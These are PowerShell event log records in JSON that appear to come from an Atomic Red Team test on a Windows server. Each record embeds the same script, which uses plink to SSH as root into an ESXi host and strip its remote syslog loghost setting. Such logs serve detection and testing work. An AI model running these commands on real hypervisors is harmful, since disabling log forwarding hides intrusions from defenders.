{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 08:01:54.0856155"},"EventRecordID":"1067","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=104dc30a-6dfc-4f2d-be4b-9dcd503d50c3\r\n\tHostApplication=powershell.exe &amp; {# Extract line with IP address from the syslog configuration output\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" &gt; c:\\temp\\loghost.txt\r\n\r\n# Replace the IP with \"0\"\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\r\n\r\n# Extract the IP from the line extracted from findstr\r\n$inputFilePath = \"c:\\temp\\loghost.txt\"\r\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\r\n\r\n$fileContent = Get-Content -Path $inputFilePath -Raw\r\n\r\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\r\n Write-Host \"The content is $fileContent\"\r\n Write-Host \"The file is empty\"\r\n} else {\r\n # Use a regular expression to extract IP addresses\r\n $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\r\n \r\n $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\r\n\r\n $output | Out-File -FilePath $outputFilePath -Encoding ascii\r\n \r\n Write-Host \"IP addresses extracted and saved to $outputFilePath\"\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 08:01:54.0856155"},"EventRecordID":"1068","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=104dc30a-6dfc-4f2d-be4b-9dcd503d50c3\r\n\tHostApplication=powershell.exe &amp; {# Extract line with IP address from the syslog configuration output\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" &gt; c:\\temp\\loghost.txt\r\n\r\n# Replace the IP with \"0\"\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\r\n\r\n# Extract the IP from the line extracted from findstr\r\n$inputFilePath = \"c:\\temp\\loghost.txt\"\r\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\r\n\r\n$fileContent = Get-Content -Path $inputFilePath -Raw\r\n\r\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\r\n Write-Host \"The content is $fileContent\"\r\n Write-Host \"The file is empty\"\r\n} else {\r\n # Use a regular expression to extract IP addresses\r\n $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\r\n \r\n $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\r\n\r\n $output | Out-File -FilePath $outputFilePath -Encoding ascii\r\n \r\n Write-Host \"IP addresses extracted and saved to $outputFilePath\"\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 08:01:54.0856155"},"EventRecordID":"1069","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=104dc30a-6dfc-4f2d-be4b-9dcd503d50c3\r\n\tHostApplication=powershell.exe &amp; {# Extract line with IP address from the syslog configuration output\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" &gt; c:\\temp\\loghost.txt\r\n\r\n# Replace the IP with \"0\"\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\r\n\r\n# Extract the IP from the line extracted from findstr\r\n$inputFilePath = \"c:\\temp\\loghost.txt\"\r\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\r\n\r\n$fileContent = Get-Content -Path $inputFilePath -Raw\r\n\r\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\r\n Write-Host \"The content is $fileContent\"\r\n Write-Host \"The file is empty\"\r\n} else {\r\n # Use a regular expression to extract IP addresses\r\n $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\r\n \r\n $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\r\n\r\n $output | Out-File -FilePath $outputFilePath -Encoding ascii\r\n \r\n Write-Host \"IP addresses extracted and saved to $outputFilePath\"\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 08:01:54.0856155"},"EventRecordID":"1070","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=104dc30a-6dfc-4f2d-be4b-9dcd503d50c3\r\n\tHostApplication=powershell.exe &amp; {# Extract line with IP address from the syslog configuration output\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" &gt; c:\\temp\\loghost.txt\r\n\r\n# Replace the IP with \"0\"\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\r\n\r\n# Extract the IP from the line extracted from findstr\r\n$inputFilePath = \"c:\\temp\\loghost.txt\"\r\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\r\n\r\n$fileContent = Get-Content -Path $inputFilePath -Raw\r\n\r\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\r\n Write-Host \"The content is $fileContent\"\r\n Write-Host \"The file is empty\"\r\n} else {\r\n # Use a regular expression to extract IP addresses\r\n $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\r\n \r\n $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\r\n\r\n $output | Out-File -FilePath $outputFilePath -Encoding ascii\r\n \r\n Write-Host \"IP addresses extracted and saved to $outputFilePath\"\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 08:01:54.0856155"},"EventRecordID":"1071","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=104dc30a-6dfc-4f2d-be4b-9dcd503d50c3\r\n\tHostApplication=powershell.exe &amp; {# Extract line with IP address from the syslog configuration output\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" &gt; c:\\temp\\loghost.txt\r\n\r\n# Replace the IP with \"0\"\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\r\n\r\n# Extract the IP from the line extracted from findstr\r\n$inputFilePath = \"c:\\temp\\loghost.txt\"\r\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\r\n\r\n$fileContent = Get-Content -Path $inputFilePath -Raw\r\n\r\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\r\n Write-Host \"The content is $fileContent\"\r\n Write-Host \"The file is empty\"\r\n} else {\r\n # Use a regular expression to extract IP addresses\r\n $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\r\n \r\n $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\r\n\r\n $output | Out-File -FilePath $outputFilePath -Encoding ascii\r\n \r\n Write-Host \"IP addresses extracted and saved to $outputFilePath\"\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 08:01:54.0856155"},"EventRecordID":"1072","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=104dc30a-6dfc-4f2d-be4b-9dcd503d50c3\r\n\tHostApplication=powershell.exe &amp; {# Extract line with IP address from the syslog configuration output\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" &gt; c:\\temp\\loghost.txt\r\n\r\n# Replace the IP with \"0\"\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\r\n\r\n# Extract the IP from the line extracted from findstr\r\n$inputFilePath = \"c:\\temp\\loghost.txt\"\r\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\r\n\r\n$fileContent = Get-Content -Path $inputFilePath -Raw\r\n\r\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\r\n Write-Host \"The content is $fileContent\"\r\n Write-Host \"The file is empty\"\r\n} else {\r\n # Use a regular expression to extract IP addresses\r\n $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\r\n \r\n $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\r\n\r\n $output | Out-File -FilePath $outputFilePath -Encoding ascii\r\n \r\n Write-Host \"IP addresses extracted and saved to $outputFilePath\"\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 08:01:54.2966585"},"EventRecordID":"1073","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=104dc30a-6dfc-4f2d-be4b-9dcd503d50c3\r\n\tHostApplication=powershell.exe &amp; {# Extract line with IP address from the syslog configuration output\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" &gt; c:\\temp\\loghost.txt\r\n\r\n# Replace the IP with \"0\"\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\r\n\r\n# Extract the IP from the line extracted from findstr\r\n$inputFilePath = \"c:\\temp\\loghost.txt\"\r\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\r\n\r\n$fileContent = Get-Content -Path $inputFilePath -Raw\r\n\r\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\r\n Write-Host \"The content is $fileContent\"\r\n Write-Host \"The file is empty\"\r\n} else {\r\n # Use a regular expression to extract IP addresses\r\n $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\r\n \r\n $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\r\n\r\n $output | Out-File -FilePath $outputFilePath -Encoding ascii\r\n \r\n Write-Host \"IP addresses extracted and saved to $outputFilePath\"\r\n}}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=a573d7a9-5bc0-46fc-ab5a-e86630b4482c\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 08:01:55.9150553"},"EventRecordID":"1074","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=16\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=104dc30a-6dfc-4f2d-be4b-9dcd503d50c3\r\n\tHostApplication=powershell.exe &amp; {# Extract line with IP address from the syslog configuration output\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" &gt; c:\\temp\\loghost.txt\r\n\r\n# Replace the IP with \"0\"\r\nC:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\r\n\r\n# Extract the IP from the line extracted from findstr\r\n$inputFilePath = \"c:\\temp\\loghost.txt\"\r\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\r\n\r\n$fileContent = Get-Content -Path $inputFilePath -Raw\r\n\r\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\r\n Write-Host \"The content is $fileContent\"\r\n Write-Host \"The file is empty\"\r\n} else {\r\n # Use a regular expression to extract IP addresses\r\n $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\r\n \r\n $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\r\n\r\n $output | Out-File -FilePath $outputFilePath -Encoding ascii\r\n \r\n Write-Host \"IP addresses extracted and saved to $outputFilePath\"\r\n}}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=a573d7a9-5bc0-46fc-ab5a-e86630b4482c\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
